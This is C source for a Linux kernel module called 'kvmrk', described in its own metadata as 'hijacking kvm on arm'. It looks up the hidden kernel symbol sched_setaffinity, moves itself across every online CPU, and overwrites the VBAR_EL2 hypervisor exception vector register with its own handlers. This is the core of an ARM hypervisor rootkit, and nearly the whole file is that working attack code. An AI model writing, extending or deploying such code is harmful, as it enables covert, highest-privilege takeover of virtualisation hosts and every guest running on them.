#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kvm_host.h>
#include <asm/sysreg.h>
#include <linux/smp.h>
#include <asm/virt.h>

#include "include/kvmrk.h"
#include "include/resolve_kallsyms.h"

typedef long (*sched_setaffinity_t)(pid_t pid, const struct cpumask *in_mask);

static sched_setaffinity_t _sched_setaffinity = NULL;

long kvmrk_sched_setaffinity(pid_t pid, const struct cpumask *in_mask) {
    if (!_sched_setaffinity) {
        _sched_setaffinity = rk_kallsyms_lookup_name("sched_setaffinity");
    }

    return _sched_setaffinity(pid, in_mask);
}


extern char __kvmrk_hyp_init[];
extern void kvmrk_set_vectors(phys_addr_t phys_vector_base);
extern int kvmrk_reset_vectors(void);


MODULE_LICENSE("GPL");
MODULE_AUTHOR("wintermute");
MODULE_DESCRIPTION("hijacking kvm on arm");
MODULE_VERSION("0.01");

static int __init kvmrk_init(void) {
    printk(KERN_INFO "kvmrk: module loaded\n");

    int i;
    for (i = 0; i < num_online_cpus(); i++) {
        kvmrk_sched_setaffinity(0, get_cpu_mask(i));
        int r = kvmrk_reset_vectors();
        printk(KERN_INFO "kvmrk: reset vectors of cpu %i with return code %i\n", smp_processor_id(), r);
    }

    for (i = 0; i < num_online_cpus(); i++) {
        kvmrk_sched_setaffinity(0, get_cpu_mask(i));
        kvmrk_set_vectors(virt_to_phys(__kvmrk_hyp_init));
        printk(KERN_INFO "kvmrk: set vectors of cpu %i\n", smp_processor_id());
    }
    printk(KERN_INFO "kvmrk: replaced vbar_el2 on all cpus\n");

    // asm volatile("hvc #0\n\t");
    // register unsigned long r asm("x0");
    // printk(KERN_INFO "kvmrk: hvc returned %i\n", r);

    return 0;
}

static void __exit kvmrk_exit(void) {
    printk(KERN_INFO "kvmrk: module unloaded\n");
}

module_init(kvmrk_init);
module_exit(kvmrk_exit);
